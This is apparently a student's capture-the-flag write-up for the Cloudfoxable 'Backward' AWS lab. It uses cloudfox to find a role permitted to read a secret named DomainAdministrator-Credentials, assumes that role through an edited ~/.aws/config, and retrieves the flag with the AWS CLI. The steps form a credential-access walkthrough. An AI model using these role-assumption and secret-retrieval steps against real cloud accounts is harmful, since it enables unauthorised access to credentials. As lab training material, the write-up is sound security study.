# Challenge- Backwards
## Solution:

### To retrieve the flag for “Cloudfoxable 5 - Backward,” my first step was to determine who had access to the secret resource arn:aws:secretsmanager:us-west-2:ACCOUNTID:secret:DomainAdministrator-Credentials-SUFFIX.

#### I ran the following command to check for any permissions related to secrets:
cloudfox aws -p cloudfoxable permissions -v2 | grep -i secret

#### The output revealed that the Alexander-Arnold role had permission to access the secret:

│ Role │ Alexander-Arnold                │ Managed │ corporate-domain-admin-password-policy │ Allow  │ secretsmanager:GetSecretValue                                       │ arn:aws:secretsmanager:us-west-2:904233110107:secret:DomainAdministrator-Credentials-qhQX2l │

#### After identifying this, I proceeded to assume the Alexander-Arnold role. I updated my ~/.aws/config file by adding the following configuration:

vim ~/.aws/config

#### And then I added the role profile:

[profile alexander-arnold]
region = us-west-2
role_arn = arn:aws:iam::904233110107:role/Alexander-Arnold
source_profile = cloudfoxable

#### Once the configuration was saved, I tested the role assumption by running:

aws --profile alexander-arnold sts get-caller-identity

#### This command confirmed that I was now assuming the correct role:

{
    "UserId": "AROA5FCD6JJN64OEQLC5J:botocore-session-1743909295",
    "Account": "904233110107",
    "Arn": "arn:aws:sts::904233110107:assumed-role/Alexander-Arnold/botocore-session-1743909295"
}

#### Now that I was using the correct role, I used this command to retrieve the secret:

aws --profile alexander-arnold secretsmanager get-secret-value --secret-id arn:aws:secretsmanager:us-west-2:904233110107:secret:DomainAdministrator-Credentials-qhQX2l

#### The output revealed the flag:
{
    "ARN": "arn:aws:secretsmanager:us-west-2:904233110107:secret:DomainAdministrator-Credentials-qhQX2l",
    "Name": "DomainAdministrator-Credentials",
    "VersionId": "23D54215-BF3E-40F3-B985-EB03EDA320BB",
    "SecretString": "FLAG{backwards::IfYouFindSomethingInterstingFindWhoHasAccessToIt}",
    "VersionStages": [
        "AWSCURRENT"
    ],
    "CreatedDate": "2025-02-19T00:04:11.816000-05:00"
}

#### The flag I found was: FLAG{backwards::IfYouFindSomethingInterstingFindWhoHasAccessToIt}

### Reflection
What was your approach?
My approach was to start by identifying which roles or users had access to the secret. Then, after realizing I lacked the proper permissions, I assumed the role that did have access. I used AWS CLI commands and made changes to my ~/.aws/config file to successfully retrieve the secret.

### What was the biggest challenge?
The biggest challenge was ensuring I was correctly assuming the right role. There were multiple steps involved in updating the configuration file and confirming that the permissions were set correctly.

### How did you overcome the challenges?
I solved the challenge by carefully reviewing the permissions from the cloudfox output and confirming that my profile was set up correctly. Every step required precision and checking to make sure I had the right configuration.

### What led to the breakthrough?
The breakthrough came when I successfully assumed the correct role and used the AWS CLI to retrieve the secret. Once I was sure the role assumption worked, accessing the secret was just a matter of running the command.

### How can the learning be used in the future?
This experience highlighted the importance of understanding IAM roles, secret management, and AWS CLI setup. In future tasks, this approach will be helpful when working in environments where access to resources is restricted, and it will aid in troubleshooting permission issues more effectively.


